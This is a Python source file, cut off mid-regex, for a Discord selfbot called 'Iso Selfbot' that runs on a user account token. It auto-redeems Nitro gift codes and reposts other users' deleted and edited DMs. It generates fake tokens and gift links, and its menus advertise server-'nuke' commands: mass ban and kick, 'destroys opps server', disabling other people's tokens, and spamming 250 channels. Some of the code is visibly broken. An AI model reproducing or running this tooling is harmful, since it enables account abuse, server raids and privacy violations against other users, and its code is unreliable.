import asyncio, datetime, functools, io,json
import os,random,re,string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4
import aiohttp,colorama,discord,base64,numbers
import numpy,requests,val,dns.name
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS


start_time = time.time()

class SELFBOT():
    __version__ = 2.3

with open('config.json') as f:
  config = json.load(f)

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')
nitro_sniper = config.get('nitro_sniper')
giveaway_sniper = config.get('giveaway_sniper')

token = config.get('token')
prefix = config.get('prefix')
password = config.get('password')

loop = asyncio.get_event_loop()
languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]
m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

# Editing This Is Optional If Yk What To Do

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"
    
    print(f'''{Fore.RESET}
        ██╗░██████╗░█████╗░  ██████╗░██████╗░
        ██║██╔════╝██╔══██╗  ╚════██╗╚════██╗
        ██║╚█████╗░██║░░██║  ░░███╔═╝░█████╔╝
        ██║░╚═══██╗██║░░██║  ██╔══╝░░░╚═══██╗
        ██║██████╔╝╚█████╔╝  ███████╗██████╔╝
        ╚═╝╚═════╝░░╚════╝░  ╚══════╝╚═════╝░
         ▒   ▓▒█░░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░ ▒▒  
         ▒   ▒▒ ░░ ░ ▒  ░░░▒░ ░ ░   ░  ▒     ▒   
          ░   ▒  ░  ░ ░    ░░░ ░ ░ ░   ░  ░   ░
           ░ ░         ░ ░   ░       ░      ░ 
    ''' + Fore.RESET)
# This Bs Dont Post LMAOAOAOAO

def Clear():
    os.system('cls')


Clear()

def tokengener():
    fh = ''.join((random.choices(numbers, k=18)))
    token = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
    return token

def masstokengen():
    tokenfile = open("tokens.txt", "a")
    for i in range(300):
        fh = ''.join((random.choices(numbers, k=18)))
        tokens = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
        tokenfile.write(tokens + "\n")


def Init():
    token = config.get('token')
    try:
        Iso.run(token, bot=False, reconnect=True)
        os.system(f'title (Iso Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

toe = config.get('token')

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

colorama.init()
Iso = discord.Client()
Iso = commands.Bot(description='Iso Selfbot', command_prefix=prefix, self_bot=True)

Iso.antiraid = False
Iso.msgsniper = True
Iso.slotbot_sniper = True
Iso.giveaway_sniper = True
Iso.mee6 = False
Iso.mee6_channel = None
Iso.yui_kiss_user = None
Iso.yui_kiss_channel = None
Iso.yui_hug_user = None
Iso.yui_hug_channel = None
Iso.sniped_message_dict = {}
Iso.sniped_edited_message_dict = {}
Iso.whitelisted_users = {}
Iso.copycat = None
Iso.remove_command('help')

# Bans Anybody Who Bans In Guild

@Iso.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
  async for i in guild.audit_logs(limit = 1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.ban):

    await guild.ban(i.user,reason="Anti Nuke")

@Iso.event
async def on_member_remove(member, guild: discord.Guild):
  async for i in member.guild.audit_logs(limit = 1, after=datetime.datetime.now() - datetime.tmedelta(minutes = 2), action=discord.AuditLogAction.kick):

    await guild.ban(i.user, reason="Anti Nuke")

@Iso.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        ctx.send(f'[ERROR]: {error_str}', delete_after=3)

@Iso.event
async def on_message_edit(before, after):
    await Iso.process_commands(after)

@Iso.event
async def on_message(message):
    if Iso.copycat is not None and Iso.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Iso.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Iso.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Iso.user.id}>' in message.content:
        if Iso.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    await Iso.process_commands(message)


@Iso.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Iso.msgsniper = True
        await ctx.send('Iso Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Iso.msgsniper = False
        await ctx.send('Iso Message-Sniper is now **disabled**')

@Iso.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Iso.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Iso.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Iso.slotbot_sniper = False


@Iso.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Iso.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Iso.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Iso.giveaway_sniper = False

@Iso.event
async def on_message_delete(message):
    if message.author.id == Iso.user.id:
        return
    if Iso.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Iso.sniped_message_dict) > 1000:
        Iso.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Iso.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
            message.content) + "\n\n**Attachments:**\n" + links
        Iso.sniped_message_dict.update({channel_id: message_content})


@Iso.event
async def on_message_edit(before, after):
    if before.author.id == Iso.user.id:
        return
    if Iso.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Iso.sniped_edited_message_dict) > 1000:
        Iso.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Iso.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Iso.sniped_edited_message_dict.update({channel_id: message_content})

@Iso.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Iso.sniped_edited_message_dict:
        await ctx.send(Iso.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")

@Iso.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Iso.sniped_message_dict:
        await ctx.send(Iso.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")             

@Iso.command()   
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x0504aa, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙄𝙎𝙊 𝙎𝙀𝙇𝙁𝘽𝙊𝙏")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text="Logged In As" f"{Iso.user.name}")
  embed.add_field(name="`Account",value="shows account commands", inline = False)
  embed.add_field(name="`Fun",value="shows fun commands", inline = False)
  embed.add_field(name="`Iso",value="shows Iso Selfbot's general commands", inline = False)
  embed.add_field(name="`Nuke",value="shows nuke commands", inline = False)
  embed.add_field(name="`Murda",value="shows all commands for murda", inline = False)
  embed.add_field(name="`Mod",value="shows all mod commands", inline = False)
  embed.add_field(name="`Extra",value="shows all extra commands")
  await ctx.send(embed=embed)

@Iso.command()   
async def account(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xc0070b, timestamp=ctx.message.created_at)
  embed.set_author(name="𝘼𝘾𝘾𝙊𝙐𝙉𝙏 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text = "𝘍𝘦𝘢𝘳 𝘖𝘷𝘦𝘳 𝘓𝘰𝘷𝘦")
  embed.add_field(name="`Hypesquad {hypesquad}",value="changes your hypesquad", inline = False)
  embed.add_field(name="`Stream {status}",value="changes status to streaming", inline = False) 
  embed.add_field(name="`Play {status}",value="changes status to playing", inline = False)
  embed.add_field(name="`Watch {status}",value="changes status to watching", inline = False)
  embed.add_field(name="`Listen {status}",value="changes status to listening", inline = False)
  embed.add_field(name="`Stopactivity",value="resets your status", inline = False)
  embed.add_field(name="`Info",value="returns amount of guilds you're in", inline = False)
  await ctx.send(embed=embed)

@Iso.command()   
async def fun(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xfc6a03, timstamp=ctx.message.created_at)
  embed.set_author(name="𝙁𝙐𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url) 
  embed.set_footer(text="𝘞𝘩𝘢𝘵 𝘏𝘦 𝘑𝘢𝘤𝘬𝘪𝘯")
  embed.add_field(name="`Copycat",value="copies mentioned users messages", inline = False)
  embed.add_field(name="`Stopcopycat",value="stops copying mentioned users messages", inline = False)
  embed.add_field(name="`Copyemoji",value="copies specified emoji", inline = False)
  embed.add_field(name="`Bitcoin",value="returns bitcoins current exchange rate", inline = False)
  embed.add_field(name="`Poll",value="creates poll", inline = False)
  embed.add_field(name="`Token",value="returns mentioned users first part of token", inline = False)
  embed.add_field(name="`Ascii",value="returns {message}in ascii art", inline = False)
  embed.add_field(name="`Serverinfo",value="returns guilds information", inline = False)
  embed.add_field(name="`Banner",value="returns guilds current banner", inline = False)
  embed.add_field(name="Serverpfp",value="returns guilds current icon", inline = False)
  embed.add_field(name="`Whois",value="returns mentioned users information", inline = False)
  embed.add_field(name="`Av",value="returns mentioned users pfp", inline = False)
  embed.add_field(name="`Everyone",value="pings everyone", inline=False)
  await ctx.send(embed=embed)

@Iso.command()   
async def nuke(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xaf69ef, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙉𝙐𝙆𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text="・𝘖𝘍𝘍𝘚𝘌𝘈𝘚𝘖𝘕 給蒽後")
  embed.add_field(name="`Massb",value="mass bans every user in guild", inline = False)
  embed.add_field(name="`Massk",value="mass kicks every user in guild", inline = False)
  embed.add_field(name="`Karma",value="destroys opps server", inline = False)
  embed.add_field(name="`Tokenfuck",value="disables passed token", inline = False)
  embed.add_field(name="Tokeninfo",value="checks passed token", inline = False)
  embed.add_field(name="`Ctc",value="creates 250 text channels", inline = False)
  embed.add_field(name="`Cvc",value="creates 250 voice channels", inline = False)
  await ctx.send(embed=embed)

@Iso.command()   
async def mod(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xffdf00, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙈𝙊𝘿 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text="𝘎𝘦𝘵 𝘔𝘰𝘯𝘦𝘺 𝘛𝘢𝘬𝘦 𝘖𝘷𝘦𝘳")
  embed.add_field(name="`Ban",value="bans mentioned user", inline = False)
  embed.add_field(name="`Kick",value="kicks mentioned user", inline = False)
  embed.add_field(name="`Purge",value="purges certain amount of messages", inline = False)
  embed.add_field(name="`Massu",value="mass unbans users in guild", inline = False)
  await ctx.send(embed=embed)

@Iso.command()   
async def iso(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xffffff, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙄𝙎𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text="𝘍𝘦𝘦𝘭 𝘓𝘪𝘬𝘦 𝘔𝘶𝘳𝘥𝘢")
  embed.add_field(name="`Nitro",value="generates random nitro code", inline = False)
  embed.add_field(name="`Ping",value="returns bot's latency", inline = False)
  embed.add_field(name="`Leavegc",value="leaves all groups you're in", inline = False)
  embed.add_field(name="`Prefix {Your Choice}",value="changes prefix to what you want", inline = False)
  embed.add_field(name="`Copyserver",value="copy's server's layout", inline = False)
  embed.add_field(name="`Shutdown",value="turns off selfbot", inline = False)
  await ctx.send(embed=embed)

@Iso.command()   
async def murda(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x152238, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙁𝙀𝙀𝙇 𝙇𝙄𝙆𝙀 𝙈𝙐𝙍𝘿𝘼")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text=".𝘎𝘎/𝘝𝘈𝘕𝘐𝘛𝘠 ・𝘓𝘐𝘎𝘏𝘛𝘚 𝘖𝘕")
  embed.add_field(name="`Top5",value="returns top 5 murda members", inline = False)
  embed.add_field(name="`Iplookup",value="looks up requested ip", inline = False)
  embed.add_field(name="`Giveaway {on,off}",value="snipes giveaways", inline = False) 
  embed.add_field(name="`Slotbot {on,off}",value="snipes slotbots", inline = False)
  embed.add_field(name="`Msgsniper {on,off}",value="snipes deleted messages", inline = False)
  await ctx.send(embed=embed)

@Iso.command()   
async def extra(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x152238, timestamp=ctx.message.created_at)
  embed.set_author(name="𝙀𝙓𝙏𝙍𝘼 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
  embed.set_thumbnail(url=Iso.user.avatar_url)
  embed.set_footer(text="𝘍𝘖𝘙𝘌𝘝𝘌𝘙 𝘚𝘛𝘌𝘗𝘗𝘐𝘕")
  embed.add_field(name="`Slap",value="slaps tf outta the mentioned user", inline = False)
  embed.add_field(name="`Cuddle",value="ever felt lonely but treeshy? just cuddle", inline = False)
  embed.add_field(name="`Hug",value="hugs mentioned user", inline = False) 
  embed.add_field(name="`Smug",value="smugs mentioned user", inline = False)
  embed.add_field(name="`Pat",value="pats mentioned user", inline = False)
  embed.add_field(name="`Kiss",value="kisses mentioned user", inline = False)
  await ctx.send(embed=embed)


# Iso Selfbot's Commands Start here

@Iso.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Iso.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Iso.change_presence(activity=stream)


@Iso.command(alises=["game"])
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Iso.change_presence(activity=game)


@Iso.command(aliases=["listening"])
async def listen(ctx, *, message):
    await ctx.message.delete()
    await Iso.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))



@Iso.command(aliases=["watching"])
async def watch(ctx, *, message):
    await ctx.message.delete()
    await Iso.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@Iso.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Iso.change_presence(activity=None, status=discord.Status.dnd)

@Iso.command()
async def info(ctx):
    await ctx.send(embed=discord.Embed(title=f"{Iso.user.name} Currently In", description=f"{len(Iso.guilds)} servers | .gg/vanity | Iso Selfbot"))
    await ctx.message.delete()

@Iso.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Iso.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Iso.copycat))
    Iso.copycat = None


@Iso.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Iso.copycat = user
    await ctx.send("Now copying " + str(Iso.copycat))    

@Iso.command(aliases=["addemoji", "stealemote", "addemote"])
async def stealemoji(ctx):
    await ctx.message.delete()
    custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
    unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U000